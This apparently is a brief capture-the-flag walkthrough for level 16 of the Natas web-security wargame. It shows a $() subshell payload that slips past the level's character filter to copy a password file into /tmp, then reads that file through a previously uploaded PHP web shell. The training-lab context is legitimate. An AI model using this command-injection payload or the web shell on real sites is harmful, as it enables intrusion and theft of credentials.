#natas 16
many characters are filtered now: '/[;|&\`\\'"]/'
even though backticks are filtered, $ and () are not, so we can open a subshell that way.
simply cat the next webpass into a tmp file and read it with natas12 or 13's rce

```
?needle=$(cat+/etc/natas_webpass/natas17+>+/tmp/wwwgreatwww)&submit=Search
```
```
/upload/whatever.php?a=cat%20/tmp/wwwgreatwww
```
